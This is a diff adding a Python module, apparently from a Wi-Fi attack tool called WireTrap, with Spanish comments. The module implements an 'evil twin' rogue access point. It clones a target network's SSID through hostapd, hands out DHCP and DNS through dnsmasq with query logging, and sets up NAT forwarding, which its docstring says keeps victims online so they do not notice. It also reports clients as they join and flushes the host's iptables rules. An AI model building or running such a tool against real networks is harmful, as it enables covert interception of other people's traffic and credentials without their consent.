@@ -1,0 +1,287 @@
+import subprocess
+import threading
+import os
+import sys
+import time
+
+WIRETRAP_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+sys.path.insert(0, WIRETRAP_DIR)
+
+
+class EvilTwin:
+    """
+    Levanta un AP falso con el mismo SSID que el objetivo.
+    Usa hostapd para el AP y dnsmasq para DHCP + DNS.
+    Activa IP forwarding para que el cliente tenga internet
+    y no detecte nada raro.
+    """
+
+    def __init__(self, interface):
+        self.interface = interface
+        self.running = False
+        self._hostapd_proc = None
+        self._dnsmasq_proc = None
+
+        # Configuración de red del evil twin
+        self.gateway_ip = "192.168.87.1"
+        self.dhcp_start = "192.168.87.2"
+        self.dhcp_end   = "192.168.87.20"
+        self.subnet     = "255.255.255.0"
+
+        # Rutas de archivos temporales
+        self.hostapd_conf  = "/tmp/wiretrap_hostapd.conf"
+        self.dnsmasq_conf  = "/tmp/wiretrap_dnsmasq.conf"
+
+        # Callbacks para la GUI
+        self.on_started     = None
+        self.on_client_join = None
+        self.on_stopped     = None
+        self.on_error       = None
+
+    def _write_hostapd_conf(self, ssid, channel, security):
+        """Genera el archivo de configuración de hostapd"""
+        if security == "WPA2":
+            conf = f"""interface={self.interface}
+driver=nl80211
+ssid={ssid}
+hw_mode=g
+channel={channel}
+macaddr_acl=0
+auth_algs=1
+wpa=2
+wpa_passphrase=wiretrap123
+wpa_key_mgmt=WPA-PSK
+rsn_pairwise=CCMP
+"""
+        else:
+            # Red abierta — más fácil que el cliente conecte
+            conf = f"""interface={self.interface}
+driver=nl80211
+ssid={ssid}
+hw_mode=g
+channel={channel}
+macaddr_acl=0
+auth_algs=1
+"""
+        with open(self.hostapd_conf, "w") as f:
+            f.write(conf)
+
+    def _write_dnsmasq_conf(self, upstream_dns="8.8.8.8"):
+        """Genera el archivo de configuración de dnsmasq"""
+        conf = f"""interface={self.interface}
+bind-interfaces
+dhcp-range={self.dhcp_start},{self.dhcp_end},{self.subnet},12h
+dhcp-option=3,{self.gateway_ip}
+dhcp-option=6,{self.gateway_ip}
+server={upstream_dns}
+log-queries
+log-dhcp
+"""
+        with open(self.dnsmasq_conf, "w") as f:
+            f.write(conf)
+
+    def _setup_interface(self, channel):
+        """Configura la interfaz y la IP del gateway"""
+        cmds = [
+            f"ip link set {self.interface} down",
+            f"iw dev {self.interface} set type __ap",
+            f"ip link set {self.interface} up",
+            f"ip addr flush dev {self.interface}",
+            f"ip addr add {self.gateway_ip}/24 dev {self.interface}",
+        ]
+        for cmd in cmds:
+            subprocess.run(cmd.split(), capture_output=True)
+
+    def _enable_forwarding(self, out_interface):
+        """Activa IP forwarding y NAT para dar internet al cliente"""
+        subprocess.run(
+            ["sysctl", "-w", "net.ipv4.ip_forward=1"],
+            capture_output=True
+        )
+        # Limpiar reglas previas
+        subprocess.run(
+            ["iptables", "-F"],
+            capture_output=True
+        )
+        subprocess.run(
+            ["iptables", "-t", "nat", "-F"],
+            capture_output=True
+        )
+        # NAT: el tráfico del cliente sale por la interfaz real
+        subprocess.run([
+            "iptables", "-t", "nat", "-A", "POSTROUTING",
+            "-o", out_interface, "-j", "MASQUERADE"
+        ], capture_output=True)
+        subprocess.run([
+            "iptables", "-A", "FORWARD",
+            "-i", self.interface,
+            "-o", out_interface, "-j", "ACCEPT"
+        ], capture_output=True)
+        subprocess.run([
+            "iptables", "-A", "FORWARD",
+            "-i", out_interface,
+            "-o", self.interface, "-j", "ACCEPT"
+        ], capture_output=True)
+
+    def _disable_forwarding(self):
+        """Limpia las reglas de iptables al detener"""
+        subprocess.run(
+            ["sysctl", "-w", "net.ipv4.ip_forward=0"],
+            capture_output=True
+        )
+        subprocess.run(["iptables", "-F"], capture_output=True)
+        subprocess.run(
+            ["iptables", "-t", "nat", "-F"],
+            capture_output=True
+        )
+
+    def _kill_conflicts(self):
+        """Mata procesos que pueden interferir con hostapd/dnsmasq"""
+        subprocess.run(
+            ["pkill", "-f", "hostapd"],
+            capture_output=True
+        )
+        subprocess.run(
+            ["pkill", "-f", "dnsmasq"],
+            capture_output=True
+        )
+        time.sleep(1)
+
+    def start(self, ssid, channel=6,
+              security="OPEN", out_interface="eth0"):
+        """
+        Lanza el evil twin completo.
+
+        Args:
+            ssid:          Nombre de la red a clonar
+            channel:       Canal del AP objetivo
+            security:      OPEN o WPA2
+            out_interface: Interfaz con internet real (eth0, wlan0...)
+        """
+        if self.running:
+            return
+
+        try:
+            self._kill_conflicts()
+            self._write_hostapd_conf(ssid, channel, security)
+            self._write_dnsmasq_conf()
+            self._setup_interface(channel)
+            self._enable_forwarding(out_interface)
+
+            # Lanzar hostapd
+            self._hostapd_proc = subprocess.Popen(
+                ["hostapd", self.hostapd_conf],
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE
+            )
+
+            time.sleep(1)
+
+            # Lanzar dnsmasq
+            self._dnsmasq_proc = subprocess.Popen(
+                ["dnsmasq", "-C", self.dnsmasq_conf,
+                 "--no-daemon"],
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE
+            )
+
+            self.running = True
+
+            if self.on_started:
+                self.on_started(ssid, channel)
+
+            # Monitor en background
+            threading.Thread(
+                target=self._monitor,
+                daemon=True
+            ).start()
+
+        except Exception as e:
+            if self.on_error:
+                self.on_error(str(e))
+
+    def _monitor(self):
+        """Monitoriza la salida de dnsmasq para detectar clientes"""
+        if not self._dnsmasq_proc:
+            return
+        for line in self._dnsmasq_proc.stdout:
+            if not self.running:
+                break
+            decoded = line.decode("utf-8", errors="ignore").strip()
+            # Detectar cuando un cliente recibe IP por DHCP
+            if "DHCPACK" in decoded or "DHCPOFFER" in decoded:
+                if self.on_client_join:
+                    self.on_client_join(decoded)
+
+    def stop(self):
+        """Detiene el evil twin y limpia todo"""
+        self.running = False
+
+        if self._hostapd_proc:
+            self._hostapd_proc.terminate()
+            self._hostapd_proc = None
+
+        if self._dnsmasq_proc:
+            self._dnsmasq_proc.terminate()
+            self._dnsmasq_proc = None
+
+        self._disable_forwarding()
+        self._kill_conflicts()
+
+        # Limpiar archivos temporales
+        for f in [self.hostapd_conf, self.dnsmasq_conf]:
+            try:
+                os.remove(f)
+            except:
+                pass
+
+        if self.on_stopped:
+            self.on_stopped()
+
+
+# ── Test en terminal ──────────────────────────────────────────
+
+if __name__ == "__main__":
+    if len(sys.argv) < 4:
+        print("Uso: sudo python3 evil_twin.py "
+              "<interfaz_ap> <ssid> <interfaz_salida>")
+        print("Ejemplo: sudo python3 evil_twin.py "
+              "wlan1 MiRedTest eth0")
+        sys.exit(1)
+
+    iface     = sys.argv[1]
+    ssid      = sys.argv[2]
+    out_iface = sys.argv[3]
+
+    et = EvilTwin(iface)
+
+    def on_started(ssid, ch):
+        print(f"[+] Evil Twin activo: SSID={ssid} canal={ch}")
+
+    def on_client(info):
+        print(f"[+] Cliente conectado: {info}")
+
+    def on_stopped():
+        print("[!] Evil Twin detenido.")
+
+    def on_error(e):
+        print(f"[!] Error: {e}")
+
+    et.on_started     = on_started
+    et.on_client_join = on_client
+    et.on_stopped     = on_stopped
+    et.on_error       = on_error
+
+    print(f"[*] Levantando Evil Twin:")
+    print(f"    Interfaz AP  : {iface}")
+    print(f"    SSID         : {ssid}")
+    print(f"    Salida internet: {out_iface}")
+    print(f"    Ctrl+C para detener\n")
+
+    try:
+        et.start(ssid=ssid, channel=6,
+                 security="OPEN", out_interface=out_iface)
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        et.stop()
